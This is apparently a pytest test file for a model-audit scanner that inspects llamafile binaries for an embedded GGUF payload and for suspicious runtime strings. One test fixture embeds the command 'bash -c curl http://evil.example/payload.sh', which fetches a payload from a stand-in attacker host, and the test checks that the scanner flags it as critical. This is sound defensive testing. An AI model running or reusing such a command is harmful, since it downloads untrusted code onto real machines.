from __future__ import annotations

import struct
from pathlib import Path

from modelaudit.scanners.base import IssueSeverity
from modelaudit.scanners.llamafile_scanner import LlamafileScanner


def _build_llamafile_blob(
    *,
    runtime_lines: list[str] | None = None,
    include_marker: bool = True,
    embedded_payload: bytes | None = None,
) -> bytes:
    header = b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56
    marker = b"llamafile runtime\n" if include_marker else b"generic runtime\n"
    runtime = ("\n".join(runtime_lines or ["--threads 4", "--ctx-size 2048"])).encode("utf-8")
    payload = (
        embedded_payload if embedded_payload is not None else b"\x00" * 8192 + b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    )
    return header + marker + runtime + b"\x00" * 256 + payload


def test_llamafile_scanner_can_handle_detected_llamafile(tmp_path: Path) -> None:
    binary = tmp_path / "model.llamafile"
    binary.write_bytes(_build_llamafile_blob())

    assert LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_does_not_misclassify_generic_executable(tmp_path: Path) -> None:
    generic_exe = tmp_path / "tool.exe"
    generic_exe.write_bytes(b"MZ" + b"\x00" * 512 + b"normal executable")

    assert not LlamafileScanner.can_handle(str(generic_exe))


def test_llamafile_scanner_benign_sample_has_no_high_severity(tmp_path: Path) -> None:
    binary = tmp_path / "safe.llamafile"
    binary.write_bytes(_build_llamafile_blob())

    result = LlamafileScanner().scan(str(binary))

    high_severity = [
        issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert high_severity == []
    assert result.metadata.get("embedded_payload_offset") is not None


def test_llamafile_scanner_flags_suspicious_runtime_strings(tmp_path: Path) -> None:
    binary = tmp_path / "suspicious.llamafile"
    binary.write_bytes(
        _build_llamafile_blob(
            runtime_lines=[
                "bash -c curl http://evil.example/payload.sh",
            ]
        )
    )

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert runtime_issues
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)


def test_llamafile_scanner_handles_truncated_binary(tmp_path: Path) -> None:
    binary = tmp_path / "truncated.llamafile"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b""))

    result = LlamafileScanner().scan(str(binary))

    assert result.success
    assert any("No embedded GGUF payload marker found" in issue.message for issue in result.issues)


def test_llamafile_embedded_gguf_findings_include_location_mapping(tmp_path: Path) -> None:
    binary = tmp_path / "embedded.llamafile"
    binary.write_bytes(_build_llamafile_blob())

    result = LlamafileScanner().scan(str(binary))

    embedded_checks = [check for check in result.checks if check.name.startswith("Llamafile Embedded")]
    assert embedded_checks
    assert any((check.location or "").startswith("llamafile:") for check in embedded_checks)
